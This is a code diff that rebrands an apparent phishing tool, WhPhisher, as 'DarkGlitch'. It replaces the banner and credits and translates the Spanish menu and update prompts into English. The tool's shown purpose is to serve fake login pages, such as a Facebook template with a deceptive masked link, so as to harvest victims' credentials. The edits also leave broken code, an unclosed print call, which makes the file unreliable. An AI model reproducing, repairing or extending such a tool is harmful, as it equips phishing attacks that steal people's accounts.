@@ -5,14 +5,19 @@
 
 {
 
-__        ___     ____  _     _     _
-\ \      / / |__ |  _ \| |__ (_)___| |__   ___ _ __
- \ \ /\ / /| '_ \| |_) | '_ \| / __| '_ \ / _ \ '__|
-  \ V  V / | | | |  __/| | | | \__ \ | | |  __/ |
-   \_/\_/  |_| |_|_|   |_| |_|_|___/_| |_|\___|_|
+
+
+██████╗  █████╗ ██████╗ ██╗  ██╗ ██████╗ ██╗     ██╗████████╗ ██████╗██╗  ██╗
+██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝ ██║     ██║╚══██╔══╝██╔════╝██║  ██║
+██║  ██║███████║██████╔╝█████╔╝ ██║  ███╗██║     ██║   ██║   ██║     ███████║
+██║  ██║██╔══██║██╔══██╗██╔═██╗ ██║   ██║██║     ██║   ██║   ██║     ██╔══██║
+██████╔╝██║  ██║██║  ██║██║  ██╗╚██████╔╝███████╗██║   ██║   ╚██████╗██║  ██║
+╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝
+                                                                             
 
 Phishing tool
-I am not responsible for the misuse that can be given when editing this code: v
+I am not responsible for the misuse this code:
+made by: Elton John Justaga
 
 """
 
@@ -51,11 +56,12 @@ info2= bgreen + '[' + bwhite + '•' + bgreen + '] '+ bpurple
 logo=f'''
 
 {white}- - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-{bcyan  }   __        ___     ____  _     _     _
-{bpurple}   \ \      / / |__ |  _ \| |__ (_)___| |__   ___ _ __
-{bcyan  }    \ \ /\ / /| '_ \| |_) | '_ \| / __| '_ \ / _ \ '__|
-{bpurple}     \ V  V / | | | |  __/| | | | \__ \ | | |  __/ |
-{bcyan  }      \_/\_/  |_| |_|_|   |_| |_|_|___/_| |_|\___|_|  {bred}v.2.5
+{bcyan  }██████╗  █████╗ ██████╗ ██╗  ██╗ ██████╗ ██╗     ██╗████████╗ ██████╗██╗  ██╗
+{bpurple}██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝ ██║     ██║╚══██╔══╝██╔════╝██║  ██║
+{bcyan  }██║  ██║███████║██████╔╝█████╔╝ ██║  ███╗██║     ██║   ██║   ██║     ███████║
+{bpurple}██║  ██║██╔══██║██╔══██╗██╔═██╗ ██║   ██║██║     ██║   ██║   ██║     ██╔══██║
+{bcyan  }██████╔╝██║  ██║██║  ██║██║  ██╗╚██████╔╝███████╗██║   ██║   ╚██████╗██║  ██║
+{bpurple}╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝
 
 {byellow}----> {bcyan}By {bwhite}Uvedoble {bcyan}Github {bwhite}WhBeatZ {byellow}<-----
 
@@ -142,7 +148,7 @@ def options():
         k+=1
         print()
     print()
-    print(green+'['+bwhite+'x'+bgreen+']'+byellow+' Acerca de                  '+bgreen+'['+bwhite+'m'+bgreen+']'+byellow+' Mas herramientas       '+bgreen+'['+bwhite+'0'+bgreen+']'+byellow+' Salir')
+    print(green+'['+bwhite+'x'+bgreen+']'+byellow+' About                   '+bgreen+'['+bwhite+'m'+bgreen+']'+byellow+' More tools         '+bgreen+'['+bwhite+'0'+bgreen+']'+byellow+' Exit')
     print()
     print()
 
@@ -168,20 +174,20 @@ def update():
         changelog=popen("curl -s -N https://raw.githubusercontent.com/WhBeatZ/WhPhisher/main/files/changelog.log").read()
         print(logo)
         print(f"{info}WhPhisher tiene una actualizacion!\n{info2}Actual: {bred}{version}\n{info}Disponible: {bgreen}{git_ver}\n")
-        upask=input(ask+"Quieres actualizar WhPhisher (recomendado) pulsa [y] para actualizar o [n] para cancelar --> "+bwhite)
+        upask=input(ask+"Do you want to update DarkGlitch (recommended) press \[y] to update or \[n] to cancel --> "+bwhite)
         if upask=="y":
             print(nc)
             system("cd .. && rm -rf WhPhisher && git clone https://github.com/WhBeatZ/WhPhisher.git && cd WhPhisher && python3 WhPhisher.py")
-            sprint("\n"+success+"WhPhisher se instalo correctamente :)!! Reinicia la terminal :D!\n")
+            sprint("\n"+success+"DarkGlitch installed correctly :)!! Restart the terminal \:D!\n")
 
             if (changelog != "404: Not Found"):
-                print(info2+"Cambios :D:\n"+bcyan+changelog)
+                print(info2+"Changes :D:\n"+bcyan+changelog)
             exit()
         elif upask=="n":
-            print("\n"+info+"Actualizacion cancelada, usando la antigua version :(!")
+            print("\n"+info+"Update canceled, using the old version. :(!")
             sleep(2)
         else:
-            print("\n"+error+"No disponible!\n")
+            print("\n"+error+"Not Available!\n")
             sleep(2)
 
 # Print logo
@@ -219,13 +225,13 @@ def installer(pm):
 def sudoinstaller(pm):
     for pkg in range(0, len(pkgs)):
         if system("command -v "+pkgs[pkg]+" > /dev/null 2>&1")!=0:
-            sprint(info+"Instalando "+pkgs[pkg].upper()+nc)
+            sprint(info+"Installation "+pkgs[pkg].upper()+nc)
             system("sudo "+pm+" install -y "+pkgs[pkg])
 
 
 # Ask to mask url
 def cuask(url):
-    cust= input("\n"+ask+bcyan+"Pulsa (" +bwhite+ "y" +bcyan+") para personalizar el" +byellow+ " link" +bcyan+" o (" +bwhite+ "ENTER" +bcyan+ ") para continuar sin hacer cambios" +byellow+ " -->" +bwhite+ "  ")
+    cust = input("\nPress (y) to customize the link or (ENTER) to continue without making changes -->  ")
     if not cust=="":
         masking(url)
     waiter()
@@ -233,7 +239,7 @@ def cuask(url):
 # Polite Exit
 def pexit():
     killer()
-    sprint("\n"+info2+bcyan+"Gracias por usar " +bwhite+ "WhPhisher! " +bcyan+ "By uvedoble" +byellow+ "--> " +bwhite+ "WhBeatZ" +bcyan+ " :D\n"+nc)
+    print("\n" + info2 + bcyan + "Thank you for using " + bwhite + "DarkGltch! " + bcyan + "By Elton John Justaga" + byellow + "--> " + bwhite + ":" + bcyan + " :D\n" + nc
     exit(0)
 
 
@@ -248,7 +254,7 @@ def about():
     print(bcyan+'[Instagram] '+bpurple+'                 :[WhBeatZ]  ')
 
     print()
-    print(bgreen+'['+bwhite+'0'+bgreen+']'+byellow+' Salir                     '+     bgreen+'['+bwhite+'99'+bgreen+']'+byellow+'  Menu Principal       ')
+    print(bgreen+'['+bwhite+'0'+bgreen+']'+byellow+' Exit                     '+     bgreen+'['+bwhite+'99'+bgreen+']'+byellow+'  Menu Principal       ')
     print()
     abot= input("\n > ")
     if abot== "0":
@@ -350,10 +356,10 @@ def main():
         slowprint(logo)
         options()
 
-        choose= input(ask+"Seleciona un numero :) > "+nc)
+        choose= input(ask+"Select Number :) > "+nc)
         if choose=="1" or choose == "01":
             folder="facebook"
-            mask="https://blue-verified-facebook-free"
+            mask="https://facebook-free"
             requirements(folder,mask)
         elif choose == "2" or choose == "02":
             folder="fb_advanced"
